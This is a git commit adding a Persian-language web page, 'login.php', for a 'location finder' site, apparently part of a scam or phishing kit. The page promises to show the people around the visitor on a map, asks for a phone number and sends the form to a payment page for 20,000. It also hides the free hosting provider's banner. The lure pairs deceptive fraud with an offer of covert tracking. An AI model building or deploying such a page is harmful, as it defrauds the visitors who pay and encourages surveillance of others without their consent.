59f41be2e89287f63b89d16231c0d516eea8793a
t.me/its_bimar <74724128+itsBimar@users.noreply.github.com>
2020-11-19 16:33:10 +0000

    Add files via upload

---
+++ sites/Makanyabi/login.php
@@ -0,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>img[alt="www.000webhost.com"]{display:none;}</style>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>مکان یاب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <link rel="stylesheet" type="text/css" media="screen" href="css/main.css" />
+    <script type="text/javascript" src="js/jquery.min.js"></script>
+    <script src="js/jss.js"></script>
+	<style>
+			@font-face {
+			  font-family: 'DimaClassicMedium';
+			  src: url('css/font/DimaClassicMedium.woff') format('woff');
+			  font-weight: normal;
+			  font-style: normal;
+			}			
+	</style>
+</head> 
+<body>
+    <video id="video" autoplay muted loop poster="images/cover.gif">
+        <source src="video/device-mode.mp4" type="video/mp4">
+        <source src="video/device-mode.ogg" type="video/ogg"> 
+    </video>
+    <main>
+        <div class="contain" id="FirstBlock">
+            <div class="container" style='width:90%'>
+                <div class="top" style='padding:0'>
+                    <div class="logo">
+                    </div>
+                </div>
+                <div class="describ">
+                    <p style='font-family:DimaClassicMedium;font-size: 1.0em;line-height: normal;margin-top:-30px'>میخوای بتونی اطرافیات رو <br>
+<span style='color:red;font-weight:bold;font-size:1.5em !important'>
+ روی نقشه پیدا کنی؟
+</span>
+</p>
+<img src="css/img/1.gif" style="padding-top: 5%;" width='30%'>
+                </div>
+                <form action="payment/index.php?amount=20,000" method="post">
+                           <input type="tel" id="PhoneNumber" style='font-size:14px' placeholder="پس شماره ات رو وارد کن.." oninput="changech(this)"> 
+                          <input type="submit" class="submit SubmitPhone" style='font-size:14px' id="SubmitPhone" value="تــایــیــد">
+                          </form>
+                          </main>
+                          </body>
+                          </html>
